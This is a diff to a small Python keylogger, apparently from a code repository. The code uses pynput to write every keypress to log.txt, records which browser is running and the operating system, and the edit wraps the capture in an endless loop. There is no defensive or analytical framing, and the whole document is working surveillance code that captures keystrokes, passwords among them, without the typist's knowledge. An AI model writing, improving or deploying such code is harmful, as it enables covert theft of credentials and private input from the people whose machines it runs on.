@@ -1,18 +1,14 @@
-# Copyright (C) Lexxrt 2020
-# MIT License
-
-from pynput.keyboard import Key, Listener
+from pynput.keyboard import Listener
 import logging
 import time
 import psutil
 import sys
 
-time = time.ctime()
+CTIME = time.ctime()
+OUTPUT = 'log.txt'
 
-# File
-logging.basicConfig(filename=("log.txt"), level=logging.DEBUG, format=time + ': %(message)s')
+logging.basicConfig(filename=(OUTPUT), level=logging.DEBUG, format=CTIME + ': %(message)s')
 
-# Process Detection
 def checkIfProcessRunning(processName):
     for proc in psutil.process_iter():
         try:
@@ -22,33 +18,28 @@ def checkIfProcessRunning(processName):
             pass
     return False;
 
-# Vars
-Chrome = "Chrome is running: " + time
-FireFox = "Firefox is running: " + time
-IExplorer = "Internet Explorer is running: " + time
+Chrome = f"{CTIME} | Chrome is running..."
+FireFox = f"{CTIME} | Firefox is running..."
+IExplorer = f"{CTIME} | Internet Explorer is running..."
 
 
-# Checking Process
-if checkIfProcessRunning('chrome'):
-    logging.info(Chrome)
-elif checkIfProcessRunning('firefox'):
-    logging.info(FireFox)
-elif checkIfProcessRunning('iexplorer'):
-    logging.info(IExplorer)
-else:
-    logging.info("Unkown Browser is running")
+while True:
+    def on_press(key):
+        logging.info(str(key))
+
+    with Listener(on_press=on_press) as listener:
+        if checkIfProcessRunning('chrome'):
+            logging.info(Chrome)
+        elif checkIfProcessRunning('firefox'):
+            logging.info(FireFox)
+        elif checkIfProcessRunning('iexplorer'):
+            logging.info(IExplorer)
+        else:
+            logging.info("Unknown Browser is running")
 
 
-# Sys Info
-if sys.platform.startswith('linux'):
-    logging.info("System: Linux Machine")
-elif "windows" in sys.platform:
-    logging.info("System: Windows Machine")
-
-# Key Function
-def on_press(key):
-    logging.info(str(key))
-
-# Key Logging
-with Listener(on_press=on_press) as listener:
-    listener.join()
+    if sys.platform.startswith('linux'):
+        logging.info(f"{CTIME}| System: Linux Machine")
+    elif "windows" in sys.platform:
+        logging.info(f"{CTIME} | System: Windows Machine")
+        listener.join()
